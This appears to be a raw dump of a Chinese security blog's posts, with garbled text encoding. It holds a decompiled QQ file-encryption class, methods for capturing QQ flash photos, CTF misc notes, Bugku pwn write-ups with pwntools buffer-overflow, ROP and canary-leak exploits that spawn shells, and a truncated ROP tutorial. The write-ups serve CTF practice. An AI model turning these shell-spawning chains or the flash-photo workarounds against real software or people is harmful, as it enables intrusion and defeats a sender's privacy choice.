class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//å¸¦æ—¥å¿—çš„åŠ å¯†å‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨äº†ä¸Šé¢çš„a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String object, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//è¿˜æ˜¯å¸¦æ—¥å¿—çš„åŠ å¯†å‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨äº†ä¸Šé¢çš„a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                file.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line"><span class="comment">//åç¼–è¯‘å‡ºæ¥çš„ä»£ç æ¯”ä¸Šé¢çš„è¿˜ä¹±æ­¤ç•¥ï¼Œ</span></span><br><span class="line"><span class="comment">//ä»QLogå†™å…¥çš„å†…å®¹å¤§è‡´å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»åŠ /è§£å¯†è¿‡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] a(<span class="keyword">byte</span>[] arrby) &#123;</span><br><span class="line">        <span class="comment">//ä¿è¯keyæ•°ç»„å®šé•¿æ˜¯8ï¼Ÿ</span></span><br><span class="line">        <span class="keyword">byte</span>[] arrby2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">if</span> (arrby2.length &gt; arrby.length) &#123;</span><br><span class="line">            System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby.length);</span><br><span class="line">            <span class="keyword">return</span> arrby2;</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby2.length);</span><br><span class="line">        <span class="keyword">return</span> arrby2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(File var0, File var1_5, <span class="keyword">byte</span>[] var2_7)</span> </span>&#123;</span><br><span class="line"><span class="comment">//è§£å¯†</span></span><br><span class="line">        var2_7 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_7), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15.init(<span class="number">2</span>, (Key)var2_7);</span><br><span class="line">        var2_7 = <span class="keyword">new</span> RandomAccessFile((File)var0, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        var2_7.seek(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>).length);<span class="comment">//è·³è¿‡æ–‡ä»¶å¤´</span></span><br><span class="line">        var0 = <span class="keyword">new</span> CipherOutputStream(<span class="keyword">new</span> FileOutputStream((File)var1_5), var6_15);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var1_5 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var2_7.read((<span class="keyword">byte</span>[])var1_5)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var1_5, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_10) &#123;</span><br><span class="line">            <span class="comment">//ç•¥</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//å¸¦æ—¥å¿—çš„è§£å¯†</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;decrypt had no encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.b(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Decrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¥ä¸ºèƒœåˆ©åœ¨æœ›ï¼Œæˆ‘è¯·æ•™äº†å¸ˆå…„ï¼Œå‘ç°å…¶ä¸­å‡ ä¸ªåŒ…å¾—ä¸åˆ°ï¼Œæ ¹æœ¬ç ´è§£ä¸äº†ï¼ˆo(*â‰§â–½â‰¦)ãƒ„â”â”â”“ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜ä¸çŸ¥é“keyä»ä½•æ¥ï¼Œå¤§ä½¬ä¹Ÿè¯´è¦ä¹ˆéœ€è¦å¤„äºç™»å½•çŠ¶æ€ç”¨ä¸€å®šæ–¹å¼ä»æœåŠ¡å™¨å¾—åˆ°ï¼Œè¦ä¹ˆä»æœ¬åœ°æ¶ˆæ¯å¯¹è±¡çš„å±æ€§ä¸­è·å¾—ï¼Œåæ­£å“ªä¸ªéƒ½ä¸å®¹æ˜“ï¼Œå•é ä¸€ä¸ª_fpæ–‡ä»¶å°±è§£å¯†å‡ºæ¥åŸæ–‡ä»¶åº”è¯¥ä¸å¤ªç°å®ã€‚æ‰€ä»¥æˆ‘å°±åªèƒ½æ”¾å¼ƒäº†ã€‚</p><h1 id="ç ´è§£æ–¹æ³•"><a href="#ç ´è§£æ–¹æ³•" class="headerlink" title="ç ´è§£æ–¹æ³•"></a>ç ´è§£æ–¹æ³•</h1><p>è™½ç„¶å‰é¢è¯´äº†æ²¡è§£å‡ºæ¥ï¼Œä½†æ˜¯ä¸ä»£è¡¨ä¸èƒ½è·å¾—ç…§ç‰‡å•Šï¼ˆï¿£ï¸¶ï¿£ï¼‰â†—ã€€</p><p>æä¾›ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li><p>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨bugå®ç°ï¼Œä¸¾æŠ¥å¥½å‹å¡«å†™ä¿¡æ¯æ—¶å‹¾é€‰é—ªç…§ï¼Œåœ¨ä¸¾æŠ¥æˆåŠŸåä¼šæ˜¾ç¤ºé—ªç…§å†…å®¹ï¼ˆå¥½å‹ï¼šæˆ‘tmçœŸçš„è°¢è°¢ä½ ï¼‰ï¼Œä¸è¿‡æˆ‘è§‰å¾—åé¢è…¾è®¯åº”è¯¥ä¼šä¿®å¤ã€‚</p></li><li><p>æ–¹æ³•äºŒï¼šæœ€ç®€å•çš„ï¼Œç”¨å¦ä¸€ä¸ªæ‰‹æœºæ‹ç…§ï¼Œæœ€å®ç”¨æœ€é è°±çš„(ï½ï¿£â–½ï¿£)ï½</p></li><li><p>æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨æ¨¡æ‹Ÿæœºæ‰“å¼€qqï¼Œåœ¨æ¨¡æ‹Ÿæœºé‡Œé¢æ˜¯æ— æ³•é™åˆ¶ä¸»æœºæˆªå›¾çš„ï¼Œä¸‹è½½ä¸€ä¸ªVMOSæ¨¡æ‹Ÿæœºåï¼ˆåº”ç”¨å•†åº—æœ‰ï¼‰åœ¨é‡Œé¢ä¸‹è½½ä¸€ä¸ªqqæ‰“å¼€é—ªç…§æ—¶å°±å¯ä»¥æˆªå›¾äº†[]<del>(ï¿£â–½ï¿£)</del>*</p></li></ul><p>ä¸ªäººè§‚ç‚¹ï¼šæˆ‘è§‰å¾—éå¿…è¦æƒ…å†µæ²¡å¿…è¦å»è·å¾—é—ªç…§ï¼Œæ¯•ç«Ÿåˆ«äººå‘é—ªç…§å°±æ˜¯ä¸æƒ³è®©ä½ ä¿å­˜ï¼Œæ‰€ä»¥çœ‹çœ‹å°±è¡Œäº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ„Ÿæƒ³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc</title>
      <link href="/post/ctfshow-misc.html"/>
      <url>/post/ctfshow-misc.html</url>
      
        <content type="html"><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€å°±æœ‰flag</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>æ‰“å¼€txtæ–‡ä»¶å‡ºç°ä¸€å †ä¹±ç ï¼Œä¸¢è¿›winhexå‘ç°æ˜¯pngï¼Œç›´æ¥æ”¹åç¼€åå³å¯<img src="https://i.loli.net/2021/10/05/ZC4hk6SB51DR3nd.png" alt="image.png"></p><h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>bpgæ–‡ä»¶ä½¿ç”¨bpgviewå·¥å…·æ‰“å¼€ï¼Œæ‰“å¼€åå³å¯è·å¾—flag</p><p><img src="https://i.loli.net/2021/10/05/2qfa4hTyYQSwtK8.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku pwn</title>
      <link href="/post/Bugku-PWN.html"/>
      <url>/post/Bugku-PWN.html</url>
      
        <content type="html"><![CDATA[<h1 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h1><p>checkä¸€ä¸‹å¯ä»¥çœ‹åˆ°æ˜¯64ä½ç¨‹åºï¼Œä»€ä¹ˆä¿æŠ¤ä¹Ÿæ²¡å¼€ï¼ŒIDAæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡º<img src="https://i.loli.net/2021/07/04/DjJPLQ2rEX34dvp.png" alt="å±å¹•æˆªå›¾ 2021-07-04 191959.png"></p><p>å†çœ‹å‡½æ•°çª—å£ï¼Œå¯ä»¥çœ‹è§å­˜åœ¨ä¸€ä¸ªå¯ç–‘çš„å‡½æ•°ï¼Œç‚¹è¿›å»å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªåé—¨å‡½æ•°</p><p><img src="https://i.loli.net/2021/07/04/5kmnKT92g1wJoLD.png" alt="å±å¹•æˆªå›¾ 2021-07-04 193304.png"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°åé—¨å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°flag</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400769</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="overflow2"><a href="#overflow2" class="headerlink" title="overflow2"></a>overflow2</h1><p>checkä¸€ä¸‹ï¼Œ64ä½å¼€äº†NXä¿æŠ¤ã€‚IDAæŸ¥çœ‹ï¼Œå­˜åœ¨æº¢å‡º<img src="https://i.loli.net/2021/07/04/onJhAYKWN8Sws5m.png" alt="å±å¹•æˆªå›¾ 2021-07-04 205321.png"></p><p>åœ¨å‡½æ•°çª—å£å‘ç°systemå‡½æ•°ï¼Œåœ¨å­—ç¬¦ä¸²çª—å£å‘ç°bin/shã€‚å¯ä»¥åˆ©ç”¨ROPæ¥è·å¾—shell<img src="https://i.loli.net/2021/07/04/3uyO7WHgLIjaEdX.png" alt="image.png"></p><p>æ‰¾åˆ°gadgetçš„åœ°å€<img src="https://i.loli.net/2021/07/04/CGgJonulcmIMpwt.png" alt="image.png"></p><p>æ„å»ºpayloadå°±å¯ä»¥äº†</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn5&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;114.67.246.176&quot;</span>,<span class="number">15097</span>)</span><br><span class="line">sys_addr = <span class="number">0x401050</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line">pop_rdi = <span class="number">0x40126b</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="read-note"><a href="#read-note" class="headerlink" title="read_note"></a>read_note</h1><p>ç­¾åˆ°é¢˜ï¼Œç›´æ¥å¯ä»¥è·å¾—flag</p><h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>çœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯è€ƒcanaryï¼Œcheckä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ª64ä½ç¨‹åºï¼Œå¼€äº†canaryå’ŒNXä¿æŠ¤<img src="https://i.loli.net/2021/07/03/4kYTmvGypHW5uA1.png" alt="image.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹ä¼ªä»£ç ï¼Œå¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œreadå¯ä»¥è¯»å–0x300å­—èŠ‚ï¼Œä½†ç¼“å†²åŒºåªæœ‰0x240å­—èŠ‚ç©ºé—´<img src="https://i.loli.net/2021/07/03/MjuLO6KPTU42YZH.png" alt="image.png"></p><p>æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°å­˜åœ¨bin/shï¼Œåœ¨å‡½æ•°è¡¨é‡Œé¢ä¹Ÿå­˜åœ¨systemå‡½æ•°<img src="https://i.loli.net/2021/07/03/YjeM5z9T8chxFtN.png" alt="å±å¹•æˆªå›¾ 2021-07-03 222006.png"></p><p>æ‰€ä»¥æ€è·¯å¤§æ¦‚å‡ºæ¥äº†ï¼Œåˆ©ç”¨gadgetsæ¥è·å–shellã€‚æ¥ä¸‹æ¥å°±æ˜¯æ€è€ƒå¦‚ä½•è§£å†³canaryä¿æŠ¤ï¼Œè§‚å¯Ÿä¼ªä»£ç ï¼Œé‡Œé¢æœ‰printfå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¥æ³„éœ²canaryï¼Œprintfå‡½æ•°è¾“å‡ºæ—¶ä¼šä»¥x00ä¸ºè¾“å‡ºç»“å°¾ï¼Œåªè¦æˆ‘ä»¬å°†canaryå€¼çš„x00è¦†ç›–æ‰å°±å¯ä»¥æ³„éœ²äº†ã€‚</p><p>æ‰€ä»¥ï¼Œç¬¬ä¸€æ­¥ï¼Œè·å–gadgetsã€‚å› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥ä¼ å‚æ—¶å‰å…­ä¸ªå‚æ•°æ˜¯åˆ©ç”¨rdi, rsi, rdx, rcx, r8, r9å¯„å­˜å™¨æ¥ä¼ é€’ï¼Œæ‰€ä»¥éœ€è¦å°†bin/shä¼ é€’åˆ°rdiå¯„å­˜å™¨ã€‚<img src="https://i.loli.net/2021/07/03/2RT6YD3ZijuXmnK.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ³„éœ²canaryï¼Œbufçš„åç§»é‡æ˜¯0x240-8(å‡8æ˜¯å› ä¸ºcanaryçš„å€¼åœ¨ebpå‡8çš„ä½ç½®)ï¼Œä¹‹ååˆ©ç”¨printfå‡½æ•°æ³„éœ²å³å¯ã€‚<img src="https://i.loli.net/2021/07/03/B8UpxXibkZD2VlI.png" alt="image.png"></p><p>æœ€åå†ç»„è£…ä¸€ä¸‹å°±å¯ä»¥å¾—å‡ºexpäº†ã€‚</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4_&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400963</span></span><br><span class="line">binsh = <span class="number">0x601068</span></span><br><span class="line">sys = <span class="number">0x40080C</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x240</span> - <span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please leave your name(Within 36 Length):&#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x210</span> - <span class="number">8</span>) + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Please leave a message(Within 0x200 Length):&#x27;</span> , payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-x86</title>
      <link href="/post/ROP-x86.html"/>
      <url>/post/ROP-x86.html</url>
      
        <content type="html"><![CDATA[<h1 id="ROPåŸç†"><a href="#ROPåŸç†" class="headerlink" title="ROPåŸç†"></a>ROPåŸç†</h1><p>éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong>æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p>ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸º ROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶</p><ul><li>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</li><li>å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚</li></ul><p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></h1><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆæŸ¥çœ‹é™„ä»¶ï¼Œ32ä½å¯æ‰§è¡Œæ–‡ä»¶ä¸”åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png" alt="image.png"></p><p>åˆ©ç”¨IDAæŸ¥çœ‹ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸»å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´<img src="https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png" alt="image.png"></p><p>ä¸ä»…å¦‚æ­¤ï¼Œåœ¨secureå‡½æ•°ä¸­å‘ç°äº†ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶åœ°å€ä¸º0x0804863Aï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨secureå‡½æ•°çš„ä»£ç æ¥è·å–ç³»ç»Ÿçš„shell<img src="https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png" 